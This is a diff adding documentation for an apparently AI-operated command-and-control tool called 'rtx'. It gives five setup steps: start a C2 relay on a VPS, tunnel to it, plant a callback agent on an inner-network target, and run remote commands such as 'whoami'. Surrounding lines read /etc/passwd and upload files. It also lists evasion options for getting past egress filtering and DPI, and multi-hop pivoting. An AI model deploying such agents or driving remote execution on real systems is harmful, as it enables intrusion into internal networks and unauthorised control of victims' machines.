@@ -77,6 +77,38 @@ rtxctl read -path /etc/passwd
 rtxctl upload -path /tmp/x -file ./local
 ```
 
+## Practical chain: local model + inner-network target + VPS relay (most common)
+
+AI runs locally (keys/inference stay local), the target is on an inner network (only reachable by deployed agents), and a public VPS relays control. **Inference and control are two independent flows**: inference dials the public model API directly from local; control goes through the VPS relay (the VPS only runs the server — no model, no keys).
+
+```
+Local AI ──model API──▶ public (inference, not via VPS)
+Local AI ─SSH tunnel─▶ VPS server ─▶ inner agent ─▶ target exec (control, via VPS)
+```
+
+### Setup (5 steps)
+
+```bash
+# 1) Run server on VPS (C2 relay) — open port 9000 in the cloud security group
+TOKEN=$(openssl rand -hex 16)
+./server-linux-amd64 -l :9000 -t "$TOKEN" --ctrl 127.0.0.1:9001   # add -tls to encrypt, -wsl :9080 for WS
+# 2) Reach the control API from local
+ssh -N -f -L 9001:127.0.0.1:9001 root@<vps>
+# 3) Configure locally
+rtxctl init --ctrl http://127.0.0.1:9001 --token "$TOKEN"
+# 4) Deploy the agent on the inner-network target (single file, pick arch)
+./agent -c <vps>:9000 -t "$TOKEN" -i <name> -tls -pin <server-fp> -q
+# 5) Operate from local (AI uses rtx_* tools / rtxctl against the inner machine)
+rtxctl ls && rtxctl exec -cmd "whoami"
+```
+
+Agent callback mode by egress: **TCP** (default) / **TLS** (`-tls -pin`) / **ws|wss** (HTTP-whitelist/DPI, `-c ws://`); multi-hop inner networks use Stowaway port delivery and the agent dials the nearest hop. Windows agents embed busybox (Unix syntax).
+
+### Troubleshooting
+- `rtxctl ls` empty → check the local tunnel, VPS server, token
+- agent offline → check inner-network egress to VPS, token, TLS pin
+- model not working → unrelated to rtx; check local→model-API connectivity (independent flow)
+
 ## Remote reachability scenarios
 
 - Local machine can't reach the target but an online agent can → deploy the agent on the reachable host; all AI operations are tunneled there
